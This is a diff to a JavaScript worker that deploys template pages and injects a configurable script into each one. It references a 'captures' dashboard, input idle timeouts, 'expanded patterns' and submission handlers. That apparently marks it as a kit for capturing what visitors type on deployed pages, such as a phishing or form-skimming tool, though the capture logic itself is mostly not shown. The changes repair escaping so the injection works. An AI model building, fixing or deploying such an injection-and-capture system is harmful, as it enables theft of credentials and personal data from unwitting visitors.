@@ -304,14 +304,14 @@ async function handlePublicDeploy(request, env, rootDomain) {
         if (!scriptContent) scriptContent = INJECTION_SCRIPT;
 
         // Inject Script
-        const injectionBlock = \`
+        const injectionBlock = `
         <script>
-        window.UNIQUE_CODE = "\${uniqueCode}";
+        window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};
         </script>
         <script>
-        \${scriptContent}
+        ${scriptContent}
         </script>
-        \`;
+        `;
 
         let html = templateData.content;
         // Inject before </body> if exists, else append
@@ -634,7 +634,7 @@ function renderUserDashboard() {
                         tr.innerHTML = \`
                             <td>\${date}</td>
                             <td><pre>\${jsonStr}</pre></td>
-                            <td><button class="btn-delete" onclick="deleteItem('\${item.key}')">Delete</button></td>
+                            <td><button class="btn-delete" data-key="\${item.key.replace(/"/g, '&quot;')}" onclick="deleteItem(this.getAttribute('data-key'))">Delete</button></td>
                         \`;
                         tbody.appendChild(tr);
                     });
@@ -978,7 +978,7 @@ function renderCapturesDashboard() {
 // This script will be injected into deployed pages.
 // It will be initialized in KV by calling /api/admin/init-script
 // ==========================================
-const INJECTION_SCRIPT = \`// CONFIG
+const INJECTION_SCRIPT = `// CONFIG
 const CONFIG = {
     INPUT_IDLE_TIMEOUT: 2000,
     // Expanded patterns as requested
@@ -1161,4 +1161,4 @@ const CONFIG = {
         setupSubmissionHandlers();
     }
 
-})();\`;
+})();`;
